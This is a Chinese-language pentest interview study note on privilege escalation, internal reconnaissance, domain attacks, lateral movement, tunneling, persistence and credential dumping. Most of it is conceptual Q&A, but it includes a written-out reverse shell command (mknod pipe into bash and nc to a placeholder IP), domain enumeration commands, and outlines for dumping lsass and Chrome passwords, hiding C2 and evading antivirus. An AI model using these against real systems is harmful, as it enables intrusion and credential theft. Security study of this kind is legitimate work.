---
title: 渗透测试面试系列六：内网渗透、横向移动、域渗透与权限维持
tags: [面试, 渗透测试, 内网渗透, 域渗透, 权限维持, 横向移动, 隧道, 提权]
date: 2026-07-18
---

# 渗透测试面试系列六：内网渗透、横向移动、域渗透与权限维持

<!-- more -->

## 提权

### Linux 提权方式

1. sudo 滥用提权
2. 内核漏洞提权（脏牛提权、sudo 溢出提权）
3. SUID 提权
4. 第三方服务提权（数据库、NFS 提权）
5. 计划任务提权
6. 高权限劫持提权

### 最近 Linux 提权漏洞

**CVE-2022-0847 (Dirty Pipe)**：

存在于 Linux 内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而将普通权限的用户提升到特权 root。漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。

**CVE-2021-4034 (PwnKit)**：

Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。漏洞存在于 `pkexec` 命令中，攻击者可通过参数注入执行具有 root 权限的命令。

### Windows 提权方式

1. 系统内核溢出
2. 系统配置错误提权
   - 系统服务权限配置错误
   - 计划任务
3. 组策略首选项提权
4. 绕过 UAC 提权
5. 不带引号的路径

### 数据库提权

- **MySQL**：MOF 提权、UDF 提权、VBS 启动项提权
- **SQL Server**：`xp_cmdshell` 扩展存储函数提权、差异备份提权

---

## 内网信息收集

### 拿到 WebShell 后会做什么操作（Windows）

1. 本机信息收集：管理密码、登录日志看管理员 IP、服务密码收集、网段信息查看、历史记录查看
2. 内网 DNS 域传送漏洞检测
3. 使用脚本收集：端口信息、服务信息
4. 系统命令收集：域内用户可使用域命令收集域信息，`net group "domain users" /domain` 等
5. 端口扫描工具全段扫描

### 内网服务器如何进行信息收集？

- 本机信息收集：管理密码、登录日志看管理员 IP、服务密码收集、网段信息查看、历史记录查看
- 内网 DNS 域传送漏洞
- 使用脚本收集：端口信息、服务信息
- 系统命令收集
- 域内用户可使用域命令收集域信息
- 端口扫描工具全段扫描

---

## 反弹 Shell

### Linux 除了 Bash 反弹 Shell，还有哪些方法？

Java、Python、PHP、OpenSSL、Telnet、Socat、Awk、PowerShell。

### Linux nc 不支持 -e 情况下如何反弹？

通过 `mknod` 创建管道反弹 Shell：

```bash
mknod /tmp/bmz p
/bin/bash 0</tmp/bmz | nc IP PORT 1>/tmp/bmz
```

### 正向 Shell 和反向 Shell 的区别

- **正向 Shell**：攻击者主动连接目标
- **反向 Shell**：目标主动连接攻击者

---

## 域渗透

### 白银票据 vs 黄金票据

| | 白银票据 | 黄金票据 |
|------|---------|---------|
| 用途 | 通常用于攻击域控 | 拿下域控后权限维持 |
| 本质 | 伪造门票 | 伪造发票人 |
| 伪造对象 | 服务票据（TGS） | 票据授予票据（TGT） |

### PTH 原理（哈希传递）

Pass The Hash，利用 NTLM 哈希进行身份认证，不需要知道明文密码。在 Windows 认证过程中，某些协议接受 NTLM 哈希作为认证凭据。

### 域委派

域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。

委派主要分为：

1. **非约束委派**
2. **约束委派**
3. **基于资源的约束委派（RBCD）**

### 查找域控

- DNS 查询：`nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com`
- `net time /domain`
- `net group "Domain Controllers" /domain`
- 端口扫描 389（LDAP）、636（LDAPS）

### 域内信息收集

- `net user /domain`
- `net group "domain admins" /domain`
- `net group "domain computers" /domain`
- `net group "domain users" /domain`

### 打域控思路（域控补丁打全）

1. 哈希传递（PTH）
2. 域委派利用
3. 抓哈希（DCSync）
4. IPv6 攻击（MITM6 + NTLM Relay）

---

## 横向移动

### 内网横向渗透重点攻击目标与端口

重点目标：域控、文件服务器、数据库服务器、邮件服务器、运维管理服务器。

重点端口：445（SMB）、135（RPC）、389/636（LDAP）、5985/5986（WinRM）、3389（RDP）、1433（MSSQL）、3306（MySQL）。

### 3389 无法连接的几种情况

1. 防火墙拦截
2. 服务未开启
3. 网络隔离（不同 VLAN/网段）
4. 端口被修改

---

## 代理与隧道

### 正向代理和反向代理的区别

- **正向代理**：代理客户端，客户端知道代理服务器的存在（如 Burp Suite 代理浏览器）
- **反向代理**：代理服务端，客户端不知道代理的存在（如 Nginx 反向代理后端服务）

### 内网代理/隧道工具

FRP、Neo-reGeorg、Chisel、EarthWorm、NPS。

### 出网协议有哪些

- DNS（通杀）
- HTTPS（加密）
- SMB

### 不出网怎么搞隧道

可以利用 DNS 隧道、SMB 隧道。通过 DNS 协议传输数据，将 Payload 封装在 DNS 请求的子域名中。

---

## 权限维持

### Linux 权限维持

- 公钥
- 任务计划
- 用户 UID 为 0
- 隐藏文件
- Rootkits
- 后台进程

### Windows 权限维持

- 注册表 Run 项
- 启动项
- 计划任务
- 服务
- 各类劫持（COM 劫持、DLL 劫持）

### mimikatz 的原理

mimikatz 通过读取 lsass.exe 进程内存来提取明文密码、NTLM 哈希、Kerberos 票据等认证凭据。它会调用 `ReadProcessMemory` 读取 lsass 进程的内存空间，从中解析出 Windows 认证相关的数据结构。

### 不用 mimikatz 怎么抓明文密码？

1. procdump 导出 lsass.dmp → mimikatz 离线读
2. 注册表导出 SAM/SYSTEM
3. 使用其他工具（如 LaZagne、Invoke-MimiKatz）
4. 从浏览器提取保存的密码（Chrome、Firefox）

### Chrome dump 密码的原理

Chrome 中保存的密码先被二次加密，而后被保存在 SQLite 数据库文件中：

```
%LocalAppData%\Google\Chrome\User Data\Default\Login Data
```

1. 先定位 SQLite 数据库文件
2. 读取数据库文件，获得二次加密的用户名/密码
3. 参考 Chromium 开源代码，找到 Chrome 做二次加密的方法
4. 调用对应函数解密

---

## 域前置

基于 HTTPS，利用 CDN 的 SNI 和 Host 不一致，隐藏真实 C2 IP 和域名。

## 腾讯云函数加密

利用云函数作为 C2 前置代理，通过云厂商的域名和 IP 隐藏真实 C2 服务器。

## 内网渗透降权的作用

某些操作需要降到普通用户权限才能执行（如访问特定用户文件），或者为了避免高权限进程被 EDR 重点监控。

## 存在杀软，不允许 EXE 落地怎么办

1. 无文件执行（PowerShell 反射加载）
2. 内存加载（Assembly.Load）
3. 白加黑 DLL 劫持
4. LOLBin 利用（MSBuild、InstallUtil、Regsvr32 等）
